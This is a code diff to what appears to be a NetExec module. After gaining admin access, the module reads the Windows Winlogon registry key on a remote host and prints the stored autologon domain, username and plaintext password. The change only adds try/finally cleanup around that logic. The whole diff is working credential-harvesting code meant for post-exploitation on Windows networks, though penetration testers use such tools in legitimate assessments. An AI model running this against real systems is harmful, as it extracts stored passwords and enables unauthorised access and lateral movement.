@@ -1,4 +1,5 @@
 from impacket.dcerpc.v5 import rrp
+import contextlib
 from impacket.examples.secretsdump import RemoteOperations
 from nxc.helpers.misc import CATEGORY
 
@@ -23,25 +24,30 @@ class NXCModule:
         """ """
 
     def on_admin_login(self, context, connection):
-        remoteOps = RemoteOperations(connection.conn, False)
-        remoteOps.enableRegistry()
+        remoteOps = None
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
 
-        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
-        regHandle = ans["phKey"]
-        ans = rrp.hBaseRegOpenKey(
-            remoteOps._RemoteOperations__rrp,
-            regHandle,
-            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
-        )
-        keyHandle = ans["phkResult"]
+            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
+            regHandle = ans["phKey"]
+            ans = rrp.hBaseRegOpenKey(
+                remoteOps._RemoteOperations__rrp,
+                regHandle,
+                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+            )
+            keyHandle = ans["phkResult"]
 
-        reg_keys = ["AutoAdminLogon", "DefaultDomainName", "DefaultUserName", "DefaultPassword"]
-        for reg_key in reg_keys:
-            try:
-                dataType, reg_value = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, reg_key)
-                context.log.highlight(f"{reg_key}: {reg_value}")
-            except Exception:
-                context.log.highlight(f"{reg_key}:")
+            reg_keys = ["AutoAdminLogon", "DefaultDomainName", "DefaultUserName", "DefaultPassword"]
+            for reg_key in reg_keys:
+                try:
+                    dataType, reg_value = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, reg_key)
+                    context.log.highlight(f"{reg_key}: {reg_value}")
+                except Exception:
+                    context.log.highlight(f"{reg_key}:")
 
-        rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
-        remoteOps.finish()
+            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+        finally:
+            if remoteOps is not None:
+                with contextlib.suppress(Exception):
+                    remoteOps.finish()
